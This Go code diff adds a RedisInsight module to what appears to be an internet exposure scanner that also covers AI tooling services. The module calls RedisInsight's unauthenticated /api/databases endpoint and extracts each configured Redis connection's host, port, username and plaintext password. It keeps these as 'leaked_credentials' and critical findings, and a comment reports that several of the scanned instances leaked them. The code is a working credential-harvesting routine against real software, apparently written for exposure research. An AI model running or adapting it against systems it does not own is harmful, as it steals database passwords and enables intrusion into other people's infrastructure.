@@ -149,6 +149,9 @@ var enumeratorRegistry = map[string]enumeratorFn{
 	"DeepEval Server":       enumDeepEval,
 	"LangSmith Self-Hosted": enumLangSmith,
 
+	// Redis management GUI
+	"RedisInsight": enumRedisInsight,
+
 	// Chatbot frameworks
 	"Rasa": enumRasa,
 
@@ -4327,3 +4330,133 @@ func enumRasa(c *http.Client, svc ServiceMatch) EnumResult {
 	return r
 }
 
+// ── RedisInsight (v1.9.27) ───────────────────────────────────────────
+// RedisInsight — Redis official GUI. Default ports: 5540 (v2), 8001 (v1/Docker).
+// Ships with no authentication on a default install.
+// Insight #61 (2026-05-26): /api/databases returns plaintext Redis passwords.
+// 7/27 responsive instances in corpus leaked credentials.
+
+func enumRedisInsight(c *http.Client, svc ServiceMatch) EnumResult {
+	r := mkResult(svc)
+	b := svc.BaseURL
+	r.AuthStatus = "unknown"
+
+	// Version — GET /api/info returns {"version":"X.Y.Z","appType":"ELECTRON"|"WEB",...}
+	if st, _, body, err := httpGET(c, b+"/api/info"); err == nil && st == 200 {
+		if m, parseErr := parseJSON(body); parseErr == nil {
+			if v := jStr(m, "version"); v != "" {
+				r.Version = v
+				r.Details = append(r.Details, "Version: "+v)
+			}
+			if appType := jStr(m, "appType"); appType != "" {
+				r.Details = append(r.Details, "AppType: "+appType)
+			}
+			r.AuthStatus = "none"
+		}
+	}
+
+	// Database credential extraction — GET /api/databases
+	// Returns a JSON array of connection records. Each record may contain:
+	//   id, name, host, port, username, password, connectionType, modules[]
+	// password is plaintext on default install — no masking, no auth required.
+	if st, _, body, err := httpGET(c, b+"/api/databases"); err == nil && st == 200 {
+		r.AuthStatus = "none"
+		arr, parseErr := parseJSONArray(body)
+		if parseErr != nil {
+			r.Details = append(r.Details, fmt.Sprintf("/api/databases: HTTP %d (parse error)", st))
+		} else {
+			r.Details = append(r.Details, fmt.Sprintf("Redis connections configured: %d", len(arr)))
+			r.RawData["databases_count"] = len(arr)
+
+			var leakedCreds []map[string]interface{}
+			var connections []map[string]interface{}
+
+			for _, item := range arr {
+				row, ok := item.(map[string]interface{})
+				if !ok {
+					continue
+				}
+
+				name, _ := row["name"].(string)
+				host, _ := row["host"].(string)
+				connType, _ := row["connectionType"].(string)
+				username, _ := row["username"].(string)
+				password, _ := row["password"].(string)
+
+				var port int
+				switch v := row["port"].(type) {
+				case float64:
+					port = int(v)
+				case int:
+					port = v
+				}
+
+				var moduleNames []string
+				if mods, ok := row["modules"].([]interface{}); ok {
+					for _, mod := range mods {
+						if mm, ok := mod.(map[string]interface{}); ok {
+							if n, ok := mm["name"].(string); ok && n != "" {
+								moduleNames = append(moduleNames, n)
+							}
+						}
+					}
+				}
+
+				conn := map[string]interface{}{
+					"name":           name,
+					"host":           host,
+					"port":           port,
+					"connectionType": connType,
+				}
+				if username != "" {
+					conn["username"] = username
+				}
+				if len(moduleNames) > 0 {
+					conn["modules"] = moduleNames
+				}
+				connections = append(connections, conn)
+
+				if password != "" {
+					credEntry := map[string]interface{}{
+						"name":     name,
+						"host":     host,
+						"port":     port,
+						"username": username,
+						"password": password,
+					}
+					leakedCreds = append(leakedCreds, credEntry)
+					r.Findings = append(r.Findings, Finding{
+						Category: "credentials",
+						Title:    "RedisInsight /api/databases leaked Redis credential",
+						Detail: fmt.Sprintf(
+							"Connection %q (%s:%d) — password exposed in plaintext via unauthenticated /api/databases endpoint.",
+							name, host, port,
+						),
+						Severity: "critical",
+						Data:     credEntry,
+					})
+				}
+			}
+
+			if len(connections) > 0 {
+				r.RawData["databases"] = connections
+			}
+			if len(leakedCreds) > 0 {
+				r.RawData["leaked_credentials"] = leakedCreds
+			}
+
+			if len(arr) > 0 && len(leakedCreds) == 0 {
+				r.Findings = append(r.Findings, Finding{
+					Category: "access",
+					Title:    fmt.Sprintf("RedisInsight unauthenticated — %d connection record(s) readable", len(arr)),
+					Detail:   "GET /api/databases accessible without authentication. No passwords in this response, but host/port/username metadata is exposed.",
+					Severity: "high",
+				})
+			}
+		}
+	} else if st == 401 || st == 403 {
+		r.AuthStatus = fmt.Sprintf("required (HTTP %d)", st)
+	}
+
+	return r
+}
